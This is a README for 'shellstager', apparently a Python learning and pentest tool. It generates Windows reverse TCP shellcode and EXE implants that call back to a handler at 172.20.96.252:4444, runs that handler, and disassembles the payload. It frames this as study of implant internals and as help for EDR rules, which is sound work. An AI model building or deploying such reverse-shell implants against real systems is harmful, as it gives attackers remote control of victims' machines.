# shellstager

This tool helps on Shellcode understanding and development. It also includes Service Handler to help simulating remote attacks and for possible EDR rules creation.

```
$ ~/shellstager/ python shellstager.py payload -h
usage: payload [-h] [-l] [-s SEARCH_PAYLOAD] {add,get,disasm} ...

ShellStager - Shellcode maker for penetration testing.

positional arguments:
  {add,get,disasm}
    add                 Add new Payload script.
    get                 Get Payload data.
    disasm              Show Disassembly of Payload.

optional arguments:
  -h, --help            show this help message and exit
  -l, --list-payloads   List all available Payloads.
  -s SEARCH_PAYLOAD, --search-payload SEARCH_PAYLOAD
                        List all available Payloads.
```

**Dumping raw Shellcode to commandline**
```
$ ~/shellstager/ python shellstager.py payload get --name windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444 -f raw
`1ۉd0[
8u};}$uXP$fHP څt>I411
           JPڋډЉD$$ZZaY[QX_[)TPh)kj
h`h\PPPP@P@Ph՗jVWhtaՅt
udjjVWh_Ճ~66j@hVjhXSSjVSWh_Ճ}%Xh@jPh
                                    /0WhunMa^^
                                              $p)uVjS%
```

**Creating an EXE implant/payload**
```
$ ~/shellstager/ python shellstager.py payload get --name windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444 -f exe
MZ@     !L!T␤␋⎽ ⎻⎼⎺±⎼▒└ ␌▒┼┼⎺├ ␉␊ ⎼┤┼ ␋┼ DOS └⎺␍␊↓
$]┴⎽┴⎽┴⎽V▒┴⎽R␋␌␤┴⎽PEL␌␉

                        @ .text` ``1ۉd0[
8u};}$uXP$fHP څt>I411                   [K&1s(1<a|,
           JPڋډЉD$$ZZaY[QX_[)TPh)kj
h`h\PPPP@P@Ph՗jVWhtaՅt
udjjVWh_Ճ~66j@hVjhXSSjVSWh_Ճ}%Xh@jPh
                                    /0WhunMa^^
                                              $p)uVjS%
```

**Running the Service Handler**
```
$ ~/shellstager/ python shellstager.py handler run --payload windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444
[*] Started Reverse TCP handler for 172.20.96.252:4444

```

**Shellcode Disassembly
```
$ ~/shellstager/ python shellstager.py payload disasm --name windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444 --lines 30
[*] Showing 30 lines disassembly:
    0x0:        cld
    0x1:        call    0x96
    0x6:        pushal
    0x7:        xor     ebx, ebx
    0x9:        mov     ebp, esp
    0xb:        mov     ebx, dword ptr fs:[0x30]
    0x12:       mov     ebx, dword ptr [ebx + 0xc]
    0x15:       mov     ebx, dword ptr [ebx + 0x14]
    0x18:       movzx   ecx, word ptr [ebx + 0x26]
    0x1c:       xor     edi, edi
    0x1e:       mov     esi, dword ptr [ebx + 0x28]
    0x21:       xor     eax, eax
    0x23:       lodsb   al, byte ptr [esi]
    0x24:       cmp     al, 0x61
    0x26:       jl      0x2a
    0x28:       sub     al, 0x20
    0x2a:       ror     edi, 0xd
    0x2d:       add     edi, eax
    0x2f:       loop    0x21
    0x31:       push    ebx
    0x32:       push    edi
    0x33:       mov     ebx, dword ptr [ebx + 0x10]
    0x36:       mov     eax, dword ptr [ebx + 0x3c]
    0x39:       add     eax, ebx
    0x3b:       mov     eax, dword ptr [eax + 0x78]
    0x3e:       test    eax, eax
    0x40:       je      0x90
    0x42:       add     eax, ebx
    0x44:       push    eax
    0x45:       mov     ecx, dword ptr [eax + 0x18]
```

<br><br><br>
Note:<br>
*This is an attempt on understanding internals of Shellcodes in backdoors or implants if you will. Although that Metasploit was used to be written in Python, I write this as it is my way of learning things.*

<br><br>
References:
<br>MASM
<br>Metasploit
<br>Capstone
<br>Keystone
<br>pefile
